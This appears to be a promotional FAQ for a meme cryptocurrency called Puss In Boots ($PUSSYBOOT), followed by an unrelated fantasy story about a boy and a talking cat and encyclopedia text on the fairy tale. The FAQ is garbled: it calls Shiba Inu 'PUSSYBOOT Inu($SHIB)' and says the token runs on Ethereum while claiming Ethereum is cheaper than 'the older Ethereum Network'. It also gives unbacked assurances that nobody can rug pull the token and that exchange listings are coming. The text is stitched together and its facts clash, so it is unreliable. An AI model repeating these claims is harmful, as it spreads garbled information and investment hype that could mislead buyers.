FAQ
Answering your questions.

How is Puss In Boots different than other cryptos like PUSSYBOOT Inu or Dogecoin?

Puss In Boots ($PUSSYBOOT) has a fully distributed decentralized supply, 50% of tokens were burnt and 50% were locked as liquidity until 2099. This means no one controls the price of PUSSYBOOT besides you, the community. No developer tokens, no team tokens, no one can dump PUSSYBOOT bc no more PUSSYBOOT exist. No one can rug pull PUSSYBOOT bc the liquidity is locked for over 78 more years. Puss In Boots is likely the only cryptocurrency who can say this. On the other hand PUSSYBOOT Inu gave its tokens to Vitalik. He may lose the keys, he may suffer unfortunate events, he is only human and can make mistakes. The only 100% way to protect holders is to truly burn and lock tokens like Puss In Boots($PUSSYBOOT) did, not to send them to Vitalik the ETH founder like PUSSYBOOT Inu($SHIB) did.


Is the PUSSYBOOT token accessible, does it have any utility?

$PUSSYBOOT is a crypto token native to the Ethereum Blockchain (ETH) network. The amount of people using Ethereum Blockchain has grown by several million this year alone. Quicky becoming a favorite network for both developers and users the ETH network is much faster and much cheaper (up to 50x cheaper) than the older Ethereum Network which is used by SHIB. Since Puss In Boots is native to Ethereum Blockchain $PUSSYBOOT can be used in thousands of decentralized applications much more quickly and much less expensively than many other tokens not on this network. These applications are things like swaps, farming, staking, blockchain games, NFT applications, community voting, and much more. Ethereum Blockchain is constantly growing, new applications are being developed here every day.

How do I buy PUSSYBOOT token?
-
Currently PUSSYBOOT are available on UniSwap here. We strongly believe in the true nature of crypto and the freedoms decentralized exchanges offer our users. Early in it's development PUSSYBOOT will only be available on DEX exchanges but at some time in the near future PUSSYBOOT will become available on centralized exchanges as well.
Fate is a fickle thing, it can be searched for, or it can be handed to you. While out for a walk after school, it found one boy deep in thought. The boy was average, not possessing any particular skills or talents. His greatest strength came in the form of emotion. He was a deeply caring boy, looking to comfort others rather than himself. Near the end of his walk, his mind was overtaken by the sound of a creature in need, and he searched wildly for the source. He came upon a pond, where in the middle of it he saw a gorgeous brown cat, desperately trying to get free. Without hesitation he dove into the water, intent on saving the helpless animal. In his quick reaction, he failed to remember a vital piece of information, he couldn’t swim. Cold and darkness overtook him as he sunk below the surface, losing sight of the cat. With all the strength he possessed, the boy reached out and felt the warm body of the creature, pushing him to the shallower waters, all the while sinking lower and lower. Helpless, the boy thought all was lost and succumbed to the fate he believed he was given. The silence before death was broken by a voice as sweet as honey, it was the cat speaking to him. His name was Havana, and he was touched by the boy’s actions. Havana did not believe it was right for the boy to die and wanted to share a life of his own for him. In doing so, Havana unknowingly released 2 lives, one going to the boy he desperately wanted to save and the other finding its way to an unsuspecting girl, hoping for a change. The two would share a bond that neither knew about until the time came when they would find each other.

"Master Cat or the Booted Cat" (Italian: Il gatto con gli stivali; French: Le Maître chat ou le Chat botté), commonly known in English as "Puss in Boots", is an Italian[1][2] fairy tale, later spread throughout the rest of Europe, about an anthropomorphic cat who uses trickery and deceit to gain power, wealth, and the hand of a princess in marriage for his penniless and low-born master.

The oldest written telling is by Italian author Giovanni Francesco Straparola, who included it in his The Facetious Nights of Straparola (c. 1550–1553) in XIV–XV. Another version was published in 1634 by Giambattista Basile with the title Cagliuso, and a tale was written in French at the close of the seventeenth century by Charles Perrault (1628–1703), a retired civil servant and member of the Académie française. There is a version written by Girolamo Morlini, from whom Straparola used various tales in The Facetious Nights of Straparola.[3] The tale appeared in a handwritten and illustrated manuscript two years before its 1697 publication by Barbin in a collection of eight fairy tales by Perrault called Histoires ou contes du temps passé.[4][5] The book was an instant success and remains popular.[3]
